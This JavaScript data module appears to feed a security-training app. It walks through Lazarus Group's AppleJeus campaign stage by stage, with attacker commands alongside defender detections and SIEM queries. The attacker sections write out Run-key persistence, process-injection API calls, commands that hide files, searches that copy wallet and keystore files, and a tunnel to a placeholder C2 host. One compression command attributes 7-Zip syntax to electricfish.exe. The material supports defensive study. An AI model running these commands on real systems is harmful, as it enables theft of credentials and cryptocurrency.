const lazarus = {
  id: "lazarus",
  name: "Lazarus Group",
  aliases: ["Hidden Cobra", "Guardians of Peace", "APT38", "Zinc"],
  origin: "North Korea",
  motivation: "Financial / Espionage",
  description:
    "Lazarus Group is a DPRK state-sponsored threat actor attributed to North Korea's Reconnaissance General Bureau. Active since at least 2009, responsible for the Sony Pictures hack, WannaCry ransomware, and over $3 billion in cryptocurrency theft targeting financial institutions and crypto exchanges.",
  campaigns: [
    {
      id: "applejeus-2018",
      name: "Operation AppleJeus",
      year: "2018–present",
      target: "Cryptocurrency Exchanges & Financial Institutions",
      summary:
        "Lazarus Group targeted cryptocurrency exchange employees with trojanized trading software, deploying the FALLCHILL RAT and ELECTRICFISH tunneling tool to steal private keys, exchange API credentials, and drain crypto hot wallets — with linked losses exceeding $400M.",
      sources: [
        "US-CERT Alert TA18-106A (FALLCHILL)",
        "Kaspersky Operation AppleJeus Report (2018)",
        "CISA Advisory AA21-048A",
      ],
      stages: [
        {
          id: "initial-access",
          name: "Initial Access",
          ttp: "T1566.002",
          ttpName: "Phishing: Spearphishing Link",
          phase: "Initial Access",
          attacker: {
            summary:
              "Lazarus sent targeted spearphishing emails to crypto exchange employees posing as a legitimate cryptocurrency trading company (Celas LLC). Emails contained a link to a professional-looking website offering a free trading platform download. The domain was newly registered with WHOIS privacy and bore a valid code-signing certificate to appear legitimate.",
            tools: ["Custom spearphishing kit", "Fake domain infrastructure (celasllc[.]com)", "Purchased code-signing certificate"],
            commands: [
              "// Phishing email sent from: trading-support@celasllc[.]com",
              "// Domain registered 17 days prior via WHOIS-privacy registrar",
              "// Link: https://www.celasllc[.]com/download.html",
              "// Payload filename: CelasTradePro-Installer.dmg / CelasTradePro-Installer.exe",
              "// SHA-256: 685d...c3f1 — valid Sectigo code-signing cert (purchased)",
            ],
          },
          defender: {
            logs: [
              "Email received from domain registered <30 days prior (email gateway log)",
              "Hyperlink to uncategorized domain clicked by user (proxy/DNS log)",
              "Browser download event: executable from non-whitelisted domain (EDR)",
              "Installer executed by standard user account (Event ID 4688)",
            ],
            detection:
              "Email gateway: flag messages containing links to newly-registered domains (<30 days). Proxy/DNS: alert on downloads of executable files from uncategorized categories. User awareness training targeting crypto-themed lures and unsolicited software offers.",
            siemQuery:
              'index=email sender_domain_age < 30 | search subject IN ("*trade*","*crypto*","*invest*") | stats count by sender, recipient, subject, url | join url [ search index=proxy action=allowed filetype IN ("exe","dmg","msi","pkg") ]',
            ifMissed:
              "Victim downloads the trojanized installer. Lazarus obtains initial execution on a crypto exchange employee's workstation. A fully functional trading application installs alongside the backdoor, eliminating suspicion and buying dwell time.",
          },
        },
        {
          id: "execution",
          name: "Malicious File Execution",
          ttp: "T1204.002",
          ttpName: "User Execution: Malicious File",
          phase: "Execution",
          attacker: {
            summary:
              "The CelasTradePro installer dropped a working trading application alongside a malicious updater component (Updater.exe on Windows, .plist LaunchAgent on macOS). The updater beaconed to Lazarus C2 infrastructure, retrieved the FALLCHILL RAT payload encoded as a binary blob, decoded it in memory, and executed it without touching disk.",
            tools: ["FALLCHILL RAT", "Trojanized installer (CelasTradePro)", "Malicious Updater.exe", "In-memory loader"],
            commands: [
              "// Installer drops two components simultaneously:",
              "//   CelasTradePro.exe — legitimate trading app (cover)",
              "//   Updater.exe — malicious beacon (hidden component)",
              "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v CelasUpdater /d C:\\Users\\%USERNAME%\\AppData\\Roaming\\CelasTrade\\Updater.exe",
              "GET /check_update?uid=<base64_machine_id>&v=1.0.2 HTTP/1.1",
              "Host: secure.celasllc[.]com",
              "// Response: FALLCHILL payload decoded via custom XOR routine → executed in memory",
            ],
          },
          defender: {
            logs: [
              "New application installed by standard user (Event ID 1033)",
              "Updater.exe written to %AppData% and added to Run key (Event ID 4657)",
              "Outbound HTTP from Updater.exe to newly-registered domain (proxy log)",
              "Unsigned or anomalously-signed binary loaded into memory (Sysmon Event ID 7)",
            ],
            detection:
              "Alert on newly-installed applications that immediately write child executables to %AppData% and add persistence. Monitor Updater or helper processes making outbound connections to domains not in the vendor's known-good infrastructure. Application whitelisting blocks the malicious updater.",
            siemQuery:
              'index=endpoint EventCode=4657 ObjectName="*\\CurrentVersion\\Run" process_name NOT IN ("msiexec.exe","setup.exe","installer.exe") | stats count by host, user, process_name, ObjectValueName, ObjectValue',
            ifMissed:
              "FALLCHILL RAT establishes a persistent, in-memory backdoor. Lazarus has remote code execution on the victim workstation inside the exchange network. The functioning trading application maintains the illusion of a clean install while the attacker begins internal reconnaissance.",
          },
        },
        {
          id: "process-injection",
          name: "Process Injection",
          ttp: "T1055",
          ttpName: "Process Injection",
          phase: "Defense Evasion",
          attacker: {
            summary:
              "FALLCHILL used reflective DLL injection to migrate into legitimate Windows processes (explorer.exe, svchost.exe), hiding C2 communications within trusted system process network traffic. Lazarus also deployed the ELECTRICFISH tunneling tool via the same injection chain to establish a persistent encrypted tunnel to C2 infrastructure.",
            tools: ["FALLCHILL RAT", "ELECTRICFISH tunneling tool", "Reflective DLL injection", "VirtualAllocEx / CreateRemoteThread"],
            commands: [
              "// Open target process with full access",
              "OpenProcess(PROCESS_ALL_ACCESS, FALSE, <explorer_pid>)",
              "// Allocate RWX memory in remote process",
              "VirtualAllocEx(hProcess, NULL, payload_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)",
              "// Write FALLCHILL reflective loader into remote process",
              "WriteProcessMemory(hProcess, pRemoteMem, payload, payload_size, NULL)",
              "// Trigger execution via remote thread",
              "CreateRemoteThread(hProcess, NULL, 0, pRemoteMem, NULL, 0, NULL)",
            ],
          },
          defender: {
            logs: [
              "Cross-process memory write: Updater.exe → explorer.exe (Sysmon Event ID 8 - CreateRemoteThread)",
              "PAGE_EXECUTE_READWRITE memory allocation in remote process (Sysmon Event ID 10)",
              "Network connection originating from explorer.exe to external IP (Sysmon Event ID 3)",
              "Unsigned module loaded into explorer.exe address space (Sysmon Event ID 7)",
            ],
            detection:
              "Sysmon Event ID 8 (CreateRemoteThread) is high-fidelity for this technique. Alert on any non-system process injecting into explorer.exe or svchost.exe. Network connections from explorer.exe or svchost.exe to non-Microsoft IP ranges are anomalous and should page immediately.",
            siemQuery:
              'index=endpoint EventCode=8 TargetImage IN ("*\\\\explorer.exe","*\\\\svchost.exe","*\\\\lsass.exe") NOT SourceImage IN ("C:\\\\Windows\\\\System32\\\\*","C:\\\\Program Files\\\\*","C:\\\\Program Files (x86)\\\\*") | stats count by host, SourceImage, TargetImage',
            ifMissed:
              "FALLCHILL now runs inside explorer.exe — invisible to process-based detection. All C2 traffic appears to originate from a trusted Windows system process. Lazarus begins enumerating the exchange's internal network, locating hot wallet infrastructure and trading API systems.",
          },
        },
        {
          id: "hidden-files",
          name: "Hidden File Staging",
          ttp: "T1564.001",
          ttpName: "Hide Artifacts: Hidden Files and Directories",
          phase: "Defense Evasion",
          attacker: {
            summary:
              "Lazarus staged exfiltration data and stored secondary tooling in hidden directories using the Windows hidden + system file attributes (attrib +h +s). On macOS targets, directories were prefixed with a dot. These locations evade casual inspection, default directory listings, and many commercial EDR file scanners.",
            tools: ["attrib.exe", "Custom dropper", "Native Windows/macOS filesystem APIs"],
            commands: [
              "// Create and hide staging directory",
              "md C:\\ProgramData\\Oracle\\Java\\.cache\\",
              "attrib +h +s C:\\ProgramData\\Oracle\\Java\\.cache\\",
              "// Hide ELECTRICFISH and secondary payloads",
              "attrib +h +s C:\\ProgramData\\Oracle\\Java\\.cache\\msupdate.dll",
              "attrib +h +s C:\\ProgramData\\Oracle\\Java\\.cache\\electricfish.exe",
              "// macOS variant",
              "mkdir -p /Users/Shared/.AxCrypt/ && chflags hidden /Users/Shared/.AxCrypt/",
            ],
          },
          defender: {
            logs: [
              "attrib.exe executed with +h +s flags by non-admin process (Event ID 4688)",
              "New directory created under ProgramData with dot-prefix naming (Sysmon Event ID 11)",
              "File written to hidden system directory by userland process (Sysmon Event ID 11)",
              "Hidden attribute set on executable file outside Windows directories (Event ID 4670)",
            ],
            detection:
              "Alert on attrib.exe invocations with +h or +s flags from non-system processes. File integrity monitoring on ProgramData and AppData subdirectories. EDR file creation events in hidden directories are high-fidelity indicators. Baseline all directories in ProgramData.",
            siemQuery:
              'index=endpoint EventCode=4688 process_name="attrib.exe" (cmdline="*+h*" OR cmdline="*+s*") NOT parent_process IN ("C:\\\\Windows\\\\System32\\\\*","C:\\\\Windows\\\\SysWOW64\\\\*") | stats count by host, user, parent_process, cmdline',
            ifMissed:
              "Lazarus maintains a hidden, persistent staging area for tooling and collected credentials. Standard dir commands and Windows Explorer do not reveal the files. The attacker can re-stage and reuse the hidden cache across reboots, AV scans, and partial incident response efforts.",
          },
        },
        {
          id: "exfiltration",
          name: "Crypto Credential Exfiltration",
          ttp: "T1041",
          ttpName: "Exfiltration Over C2 Channel",
          phase: "Exfiltration",
          attacker: {
            summary:
              "Lazarus used ELECTRICFISH to tunnel an encrypted proxy connection to C2 infrastructure, exfiltrating crypto wallet private keys, exchange hot wallet API keys, and employee credentials. Stolen API keys were used programmatically to drain hot wallets in real time. ELECTRICFISH rate-limited transfers to blend with baseline HTTPS traffic.",
            tools: ["ELECTRICFISH tunneling tool", "FALLCHILL RAT", "Custom credential harvester", "7-Zip (renamed)"],
            commands: [
              "// Locate crypto wallet and key material",
              "cmd.exe /c dir /s /b C:\\ 2>nul | findstr /i \"wallet.dat .key .pem keystore api_key\"",
              "cmd.exe /c xcopy \"%APPDATA%\\Ethereum\\keystore\\*\" C:\\ProgramData\\Oracle\\Java\\.cache\\ /H /Y",
              "// Compress and stage for exfil",
              "C:\\ProgramData\\Oracle\\Java\\.cache\\electricfish.exe a -mx9 -p<key> .cache\\out.7z .cache\\keystore\\",
              "// ELECTRICFISH establishes encrypted proxy tunnel",
              "// electricfish.exe <victim_ip> <c2_ip> 443 <proxy_user> <proxy_pass>",
              "// Transfer rate: ~4.2 MB/min over TLS — mimics HTTPS telemetry baseline",
            ],
          },
          defender: {
            logs: [
              "Filesystem search for wallet.dat / .key / keystore patterns (Sysmon Event ID 1 - findstr)",
              "Mass file copy to hidden staging directory (Sysmon Event ID 11)",
              "ELECTRICFISH proxy tunnel: sustained outbound TLS to single external IP (NetFlow)",
              "Exchange API key authenticated from foreign IP within seconds of local use (API audit log)",
            ],
            detection:
              "Alert on wildcard directory searches for cryptographic key file extensions. File copy events to hidden ProgramData directories are high-fidelity. NetFlow: flag sustained high-volume TLS uploads from workstations to single external IPs. Crypto exchange API: concurrent authentication from multiple geographic locations for the same key.",
            siemQuery:
              'index=endpoint process_name IN ("cmd.exe","powershell.exe") (cmdline="*wallet.dat*" OR cmdline="*keystore*" OR cmdline="*api_key*" OR cmdline="*.pem*") | stats count by host, user, cmdline | sort - count',
            ifMissed:
              "Lazarus uses stolen private keys and exchange API credentials to programmatically drain cryptocurrency hot wallets. Blockchain transactions are irreversible. Stolen funds are laundered within hours through mixers and chain-hopping. Losses linked to Operation AppleJeus-style attacks exceed $400M. Victims typically discover the breach only after on-chain analytics flag the unauthorized transfers.",
          },
        },
      ],
    },
  ],
}

export default lazarus
